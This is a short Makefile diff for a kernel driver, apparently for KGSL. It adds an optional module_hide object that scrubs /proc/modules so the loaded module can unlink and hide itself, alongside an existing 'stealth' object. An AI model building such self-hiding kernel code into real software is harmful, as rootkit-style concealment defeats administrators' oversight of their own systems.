@@ -53,6 +53,11 @@ ifneq ($(HIDE_KGSL_STRENGTH),0)
 $(DRIVER_NAME)-objs += src/stealth.o
 endif
 
+# C.1 /proc/modules scrub: only meaningful when we already unlink ourselves.
+ifneq ($(HIDE_SELF_MODULE),0)
+$(DRIVER_NAME)-objs += src/module_hide.o
+endif
+
 # -I: public headers + intra-subsystem private headers.
 ccflags-y += -I$(src)/include
 ccflags-y += -I$(src)/src
